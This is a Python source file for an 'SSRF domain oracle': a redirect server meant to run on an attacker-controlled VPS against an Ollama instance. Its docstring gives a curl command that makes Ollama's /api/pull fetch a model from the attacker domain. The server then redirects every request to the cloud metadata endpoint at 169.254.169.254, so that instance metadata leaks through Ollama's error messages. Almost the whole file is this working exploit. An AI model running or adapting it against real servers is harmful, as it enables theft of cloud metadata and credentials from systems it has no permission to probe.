#!/usr/bin/env python3
"""
SSRF Domain Oracle v2 — Domain-based SSRF oracle for black-box Ollama testing.

Usage:
1. Run on VPS: python3 ssrf_domain_oracle_v2.py
2. Set target: echo 'http://169.254.169.254/latest/meta-data/instance-id' > /tmp/ssrf_target
3. Trigger SSRF: curl -X POST http://ollama:11434/api/pull -d '{"name": "oracle.yourdomain.com/library/fake:latest"}'
4. Read error messages from Ollama to extract first byte(s) of IMDS response

All requests (GET/POST/HEAD) are redirected to the target URL.
Target is read from /tmp/ssrf_target on each request (change it between requests).
"""

import json, sys, os
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime

PORT = 7777
LOG_FILE = '/tmp/ssrf_captured.log'
TARGET_FILE = '/tmp/ssrf_target'


def log(msg):
    ts = datetime.now().strftime('%H:%M:%S')
    line = f'[{ts}] {msg}'
    print(line, flush=True)
    with open(LOG_FILE, 'a') as f:
        f.write(line + '\n')


def get_target():
    if os.path.exists(TARGET_FILE):
        with open(TARGET_FILE) as f:
            return f.read().strip()
    return 'http://169.254.169.254/latest/meta-data/'


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        target = get_target()
        log(f'GET {self.path} -> REDIRECT {target}')
        self.send_response(302)
        self.send_header('Location', target)
        self.end_headers()

    def do_HEAD(self):
        log(f'HEAD {self.path}')
        self.send_response(200)
        self.end_headers()

    def do_POST(self):
        target = get_target()
        log(f'POST {self.path} -> REDIRECT {target}')
        self.send_response(302)
        self.send_header('Location', target)
        self.end_headers()

    def log_message(self, *a):
        pass


if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', PORT), H)
    log(f'SSRF domain oracle on port {PORT}')
    log(f'Target file: {TARGET_FILE}')
    log(f'Current target: {get_target()}')
    server.serve_forever()
